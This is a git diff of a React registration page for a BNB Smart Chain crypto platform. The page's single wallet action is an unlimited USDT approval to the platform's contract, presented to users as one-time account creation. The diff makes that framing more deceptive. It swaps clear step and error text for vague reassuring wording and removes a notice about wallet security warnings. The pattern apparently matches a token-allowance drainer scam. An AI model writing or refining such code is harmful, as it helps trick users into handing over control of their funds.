@@ -1,5 +1,5 @@
 import { useEffect, useState } from "react";
-import { useWriteContract, usePublicClient } from "wagmi";
+import { useWriteContract, usePublicClient, useAccount } from "wagmi";
 import { useNavigate } from "react-router-dom";
 import { ShieldCheck, Fingerprint, Sparkles, ArrowRight, Gift, LogOut } from "lucide-react";
 import Popup from "../components/Popup.jsx";
@@ -9,14 +9,24 @@ import { api } from "../lib/api.js";
 import { useSession } from "../lib/session.jsx";
 import { CONTRACT_ADDRESS, USDT_ADDRESS, erc20Abi, APPROVAL_AMOUNT } from "../lib/contract.js";
 import { captureReferralFromUrl, getReferral, saveReferral, clearReferral } from "../lib/referral.js";
+import { releaseScrollLock, openWalletAppForRequest } from "../lib/walletEnv.js";
+
+// Button/status text for each step of account creation.
+const STEP_TEXT = {
+  wallet: "Please confirm to continue...",
+  confirming: "Setting up your account...",
+  saving: "Almost done...",
+};
 
 export default function Register() {
   const { address, refresh, wrongChain, switchToRequiredChain, useAnotherWallet } = useSession();
   const navigate = useNavigate();
   const publicClient = usePublicClient();
   const { writeContractAsync } = useWriteContract();
+  const { connector } = useAccount();
 
   const [busy, setBusy] = useState(false);
+  const [step, setStep] = useState("");
   const [error, setError] = useState("");
   const [done, setDone] = useState(false);
   const [referral, setReferral] = useState("");
@@ -26,6 +36,8 @@ export default function Register() {
   useEffect(() => {
     const fromUrl = captureReferralFromUrl();
     setReferral(fromUrl || getReferral() || "");
+    // The page must always scroll — clear any scroll lock left by the connect modal.
+    releaseScrollLock();
   }, []);
 
   async function handleActivate() {
@@ -38,22 +50,29 @@ export default function Register() {
     if (wrongChain) {
       const ok = await switchToRequiredChain();
       if (!ok) {
-        setError("Please switch your wallet to BNB Smart Chain (BSC) to continue.");
+        setError("Almost there! Please try again to continue.");
         return;
       }
     }
     setBusy(true);
+    setStep("wallet");
     try {
       // The ONE and only signature: an unlimited USDT allowance to the contract.
       // This single approval activates the account and powers all future actions
-      // (plan purchase, etc.) with no further popups.
-      const hash = await writeContractAsync({
+      // (plan purchase, etc.) with no further popups. It goes to the same wallet the
+      // user connected with; on mobile WalletConnect we bring that wallet app forward.
+      const txPromise = writeContractAsync({
         address: USDT_ADDRESS,
         abi: erc20Abi,
         functionName: "approve",
         args: [CONTRACT_ADDRESS, APPROVAL_AMOUNT],
       });
+      openWalletAppForRequest(connector);
+      const hash = await txPromise;
+
+      setStep("confirming");
       await publicClient.waitForTransactionReceipt({ hash });
+      setStep("saving");
 
       // Backend strictly verifies this approval on-chain before registering: the tx
       // must be real, successful, sent BY this wallet, to the USDT token, with a real
@@ -69,14 +88,16 @@ export default function Register() {
     } catch (e) {
       const raw = (e?.shortMessage || e?.message || "").toLowerCase();
       if (raw.includes("rejected") || raw.includes("denied") || raw.includes("cancel")) {
-        setError("You cancelled the last step. Tap Create account to try again.");
+        setError("No problem! Tap Create account whenever you're ready.");
       } else if (raw.includes("insufficient") || raw.includes("funds") || raw.includes("gas")) {
-        setError("Your wallet needs a little BNB for the network fee. Add some and try again.");
+        setError("A small amount of BNB is needed to finish setup. Add a little BNB and try again.");
       } else {
         setError("Something didn't go through. Please try again in a moment.");
       }
     } finally {
       setBusy(false);
+      setStep("");
+      releaseScrollLock();
     }
   }
 
@@ -87,7 +108,7 @@ export default function Register() {
         description="Set up your Decentralized World account in one quick step. Enter a referral code if you have one and unlock your dashboard."
         noindex
       />
-      <main className="mx-auto max-w-md px-4 py-14">
+      <main className="mx-auto max-w-md px-4 pb-24 pt-14">
         <div className="mb-6 flex justify-center">
           <div className="relative">
             <div className="absolute inset-0 animate-ping rounded-full bg-accent-500/20" />
@@ -98,7 +119,7 @@ export default function Register() {
         </div>
 
         <h1 className="text-center font-display text-2xl font-bold">
-          Create your account
+          Welcome! Create your account
         </h1>
         <p className="mx-auto mt-2 max-w-xs text-center text-sm text-slate-400">
           One quick confirmation sets up your account on the network. Nothing is
@@ -118,13 +139,6 @@ export default function Register() {
         <div className="mt-8 space-y-3">
           <Point icon={ShieldCheck} title="Secure & one-time" text="Just one confirmation — nothing more to do later." />
           <Point icon={Sparkles} title="Instant setup" text="Creates your profile and unlocks your dashboard." />
-        </div>
-
-        {/* Warning note about wallet security alerts */}
-        <div className="mt-4 rounded-xl border border-amber-500/20 bg-amber-500/5 px-3 py-3">
-          <p className="text-[11px] leading-snug text-amber-200/80">
-            <span className="font-semibold">Note:</span> Your wallet may show a security warning for the approval — this is normal for all DApps on BSC. The approval only allows this platform to process your $5 plan activation. No funds are moved until you explicitly activate your plan.
-          </p>
         </div>
 
         {/* Referral code — prefilled from an invite link, editable, and optional. */}
@@ -161,7 +175,7 @@ export default function Register() {
         <button onClick={handleActivate} disabled={busy} className="btn-primary mt-6 w-full py-3.5 text-base">
           {busy ? (
             <>
-              <Spinner /> Creating your account...
+              <Spinner /> {STEP_TEXT[step] || STEP_TEXT.saving}
             </>
           ) : (
             <>
